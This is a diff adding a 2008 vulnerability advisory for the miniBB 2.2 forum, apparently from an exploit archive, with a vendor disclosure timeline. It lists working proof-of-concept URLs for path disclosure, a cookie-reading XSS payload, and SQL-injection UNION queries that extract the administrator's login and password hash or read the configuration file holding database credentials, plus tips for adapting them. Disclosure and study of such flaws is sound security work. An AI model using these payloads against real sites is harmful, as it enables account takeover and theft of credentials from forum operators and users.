@@ -1,0 +1,82 @@
+# Author:	__GiReX__
+# Homepage:	girex.altervista.org
+# Date:		21/04/2008
+
+# CMS:		miniBB 2.2 (and maybe prior)
+# Site:		minibb.net
+
+# Bug 1:	Full Path Disclosure
+# Bug 2:	Cross Site Scripting
+# Bug 3:	Remote SQL Injection
+
+# Need:		register_globals = On
+---------------------------------------
+
+# 21/04/2008  	Vendor informed
+# 22/04/2008	miniBB 2.2a released (where they are fixed)
+# 25/04/2008	Public advisory
+
+---------------------------------------
+# Bug 1: 	Full Path Disclosure
+
+# Vuln Code:	bb_func_regusr.php
+
+25. 	$languageDown=makeValuedDropDown($glang,'language');
+
+# $glang is empty and it should be an array.
+# So for get a full path disclosure into php warning:
+
+# PoC:	[host]/[path]/index.php?action=registernew&glang=1
+----------------------------------------------------------------------------------
+
+----------------------------------------
+# Bug 2: 	Cross Site Scripting
+
+# PoC:		[host]/[path]/index.php?action=registernew&glang[]=<script>alert(document.cookie)</script>
+----------------------------------------------------------------------------------
+
+----------------------------------------
+# Bug 3:	Remote SQL Injection
+
+# Vuln Code:	setup_mysql.php
+ 
+30.	function db_simpleSelect($sus,$table='',$fields='',$uniF='',$uniC='',$uniV='',$orderby='',$limit='',$uniF2='',	
+        $uniC2='',$uniV2='',$and2=true,$groupBy=''){
+        if(!$sus){
+        ...
+42.	$xtr=(!isset($GLOBALS['xtr'])?'':$GLOBALS['xtr']);	
+	$sql='SELECT '.$fields.' FROM '.$table.$where.' '.$xtr.' '.$groupBy.' '.$orderby.' '.$limit;
+	$result=mysql_query($sql);
+	...
+53.	elseif($sus==2){
+	$xtr=(isset($GLOBALS['xtr'])?$GLOBALS['xtr']:'');
+	return mysql_result(mysql_query('SELECT '.$fields.' FROM '.$table.' '.$w.' '.$uniF.$uniC.$uniV.' '.$a.' '.$uniF2
+	.$uniC2.$uniV2.' '.$xtr),0);
+
+# The var $xtr is empty if getClForums() was not called.
+# It can be overwritten to manipulate the SQL query if register_globals = On.
+
+----------------------------------------------------------------------------------
+# Check Vuln:	[host]/[path]/index.php?action=userinfo&user=-1&xtr=OR+1
+
+# If admin's profile is displayed, it's vulnerable!
+----------------------------------------------------------------------------------
+----------------------------------------------------------------------------------
+# PoC:	 [host]/[path]/index.php?action=userinfo&user=-1
+	 &xtr=UNION+SELECT+0,concat(username,0x3a,user_password),0,0,0,0,0,0,0,0,0,0,0,0,0+FROM+minibbtable_users+
+         WHERE+user_id=1
+
+# Admin's login and hash will be displayed.
+# These are default's tables and columns, they can be different, use information_schema to find them.
+----------------------------------------------------------------------------------
+----------------------------------------------------------------------------------
+# Or with the path disclosure of Bug 1, you can try to loadfile() setup_options.php
+# where there are stored database and admin's login in plain/text.
+
+# PoC:   [host]/[path]/index.php?action=userinfo&user=-1
+	 &xtr=UNION+SELECT+0,loadfile('[full_path]/setup_options.php'),0,0,0,0,0,0,0,0,0,0,0,0,0
+
+# Encode in Hex loadfile()'s parameter if magic_quotes_gpc = On
+----------------------------------------------------------------------------------
+
+# milw0rm.com [2008-04-25]
